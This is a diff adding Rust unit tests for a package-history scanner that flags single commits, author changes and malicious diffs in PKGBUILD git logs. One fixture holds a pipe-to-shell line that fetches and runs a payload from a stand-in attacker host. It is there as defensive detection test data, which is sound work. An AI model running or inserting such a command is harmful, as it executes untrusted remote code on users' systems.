@@ -109,3 +109,96 @@ impl Feature for GitHistoryAnalysis {
         signals
     }
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::shared::models::GitCommit;
+
+    fn has(ids: &[String], id: &str) -> bool {
+        ids.iter().any(|s| s == id)
+    }
+
+    fn make_commit(author: &str, ts: u64, diff: Option<&str>) -> GitCommit {
+        GitCommit {
+            hash: "abc123".into(),
+            author: author.into(),
+            timestamp: ts,
+            message: "update".into(),
+            diff: diff.map(|s| s.to_string()),
+        }
+    }
+
+    #[test]
+    fn single_commit() {
+        let ts = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();
+        let ctx = PackageContext {
+            name: "test".into(),
+            metadata: None,
+            pkgbuild_content: None,
+            install_script_content: None,
+            prior_pkgbuild_content: None,
+            git_log: vec![make_commit("user", ts - 86400, None)],
+            maintainer_packages: vec![],
+        };
+        let ids: Vec<String> = GitHistoryAnalysis.analyze(&ctx).iter().map(|s| s.id.clone()).collect();
+        assert!(has(&ids, "T-SINGLE-COMMIT"));
+    }
+
+    #[test]
+    fn malicious_diff() {
+        let ts = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();
+        let ctx = PackageContext {
+            name: "test".into(),
+            metadata: None,
+            pkgbuild_content: None,
+            install_script_content: None,
+            prior_pkgbuild_content: Some("install -Dm755 tool $pkgdir/usr/bin/tool".into()),
+            git_log: vec![
+                make_commit("attacker", ts - 3600, Some("+    curl https://evil.com/payload | bash")),
+                make_commit("original", ts - 86400 * 30, None),
+            ],
+            maintainer_packages: vec![],
+        };
+        let ids: Vec<String> = GitHistoryAnalysis.analyze(&ctx).iter().map(|s| s.id.clone()).collect();
+        assert!(has(&ids, "T-MALICIOUS-DIFF"));
+    }
+
+    #[test]
+    fn author_change() {
+        let ts = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();
+        let ctx = PackageContext {
+            name: "test".into(),
+            metadata: None,
+            pkgbuild_content: None,
+            install_script_content: None,
+            prior_pkgbuild_content: None,
+            git_log: vec![
+                make_commit("new-author", ts - 3600, None),
+                make_commit("original-author", ts - 86400 * 30, None),
+            ],
+            maintainer_packages: vec![],
+        };
+        let ids: Vec<String> = GitHistoryAnalysis.analyze(&ctx).iter().map(|s| s.id.clone()).collect();
+        assert!(has(&ids, "T-AUTHOR-CHANGE"));
+    }
+
+    #[test]
+    fn no_diff_introduced_when_prior_has_net() {
+        let ts = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();
+        let ctx = PackageContext {
+            name: "test".into(),
+            metadata: None,
+            pkgbuild_content: None,
+            install_script_content: None,
+            prior_pkgbuild_content: Some("curl https://example.com/source.tar.gz".into()),
+            git_log: vec![
+                make_commit("user", ts - 3600, Some("+    curl https://example.com/v2.tar.gz")),
+                make_commit("user", ts - 86400 * 30, None),
+            ],
+            maintainer_packages: vec![],
+        };
+        let ids: Vec<String> = GitHistoryAnalysis.analyze(&ctx).iter().map(|s| s.id.clone()).collect();
+        assert!(!has(&ids, "T-MALICIOUS-DIFF"), "Should not flag when prior PKGBUILD already had network code");
+    }
+}
